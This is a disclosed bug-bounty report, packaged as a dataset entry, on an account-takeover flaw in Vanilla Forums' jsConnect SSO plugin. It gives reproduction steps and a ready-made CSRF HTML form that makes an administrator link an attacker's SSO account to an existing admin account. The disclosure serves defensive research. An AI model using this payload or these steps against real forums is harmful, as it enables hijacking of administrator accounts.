---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '384962'
original_report_id: '384962'
title: 'jsConnect Plugin: Takeover of existing account'
weakness: Improper Authentication - Generic
team_handle: vanilla
created_at: '2018-07-21T15:03:14.450Z'
disclosed_at: '2019-04-06T11:14:27.191Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 35
asset_identifier: '*.vanillaforums.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# jsConnect Plugin: Takeover of existing account

## Metadata

- HackerOne Report ID: 384962
- Weakness: Improper Authentication - Generic
- Program: vanilla
- Disclosed At: 2019-04-06T11:14:27.191Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description
-----------

The current version (1.5.5) of the official jsConnect plugin allows the takeover of an existing account that wasn't created using SSO - eg a previously existing admin user - by registering an account with the same name using SSO.

A successfull attack requires one request to be issued by an authenticated administrator. This can for example take place via CSRF. Other than this, the attacker does not need any special permissions.

POC
---

1. Prerequisit: Enable jsConnect and add an SSO service (eg a local WordPress instance using the Vanilla WordPress plugin). Add a user - eg `admin` - in Vanilla, eg using `vanilla-core-2-6/dashboard/user` -> "Add User" (or use the admin user which was created on installation). 
2. Attacker: Register a user with the same name and an arbitrary password in the SSO service (eg WordPress).
3. Attacker: Register with Vanilla using SSO, using the credentials from step 2. After authenticating with the SSO service, Vanilla will say that the username is already taken. Clicking on "Connect" will issue a POST request. The response will inform the attacker that a password is required. 
4. Attacker: Create a CSRF payload for the previous POST request and send it to an authenticated administrator.
5. Victim Admin: Execute the CSRF payload.
6. Attacker: Sign in using SSO. Use the credentials for the account of the SSO service created in step 2. The attacker will now have access to the account that was created in step 1, without having had access to the password for that account. 

Example CSRF code:

    <html>
      <body>
        <form action="http://192.168.0.102/vanilla-core-2-6/entry/connect/jsconnect?client_id=test" method="POST">
          <input type="hidden" name="TransientKey" value="" />
          <input type="hidden" name="hpt" value="" />
          <input type="hidden" name="Target" value="http&#58;&#47;&#47;192&#46;168&#46;0&#46;102&#47;vanilla&#45;core&#45;2&#45;6&#47;discussions" />
          <input type="hidden" name="JsConnect" value="email&#61;admin2&#37;40example&#46;com&amp;name&#61;admin2&amp;photourl&#61;http&#37;3A&#37;2F&#37;2F1&#46;gravatar&#46;com&#37;2Favatar&#37;2F7ab1e57078d6ad175c76f0c560b7688a&#37;3Fs&#37;3D96&#37;26d&#37;3Dmm&#37;26r&#37;3Dg&amp;roles&#61;subscriber&amp;uniqueid&#61;9&amp;wp&#95;nonce&#61;d79ea1a8aa&amp;client&#95;id&#61;test&amp;signature&#61;e22bcb0cb9042e6dfe2640a48afcc62c" />
          <input type="hidden" name="UserSelect" value="17" />
          <input type="hidden" name="ConnectName" value="" />
          <input type="hidden" name="ConnectPassword" value="" />
          <input type="hidden" name="Connect" value="Connect" />
          <input type="submit" value="Submit request" />
        </form>
      </body>
    </html>

The values would of course need to be adapted, but are all known to the attacking user.

I haven't looked into it in-depth yet, but my assumption is that the vulnerable code is actually in Vanilla core, likely in `applications/dashboard/controllers/class.entrycontroller.php:connect()`, so other functionality outside of the jsConnect plugin may be affected as well.

## Impact

Takeover of Vanilla account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
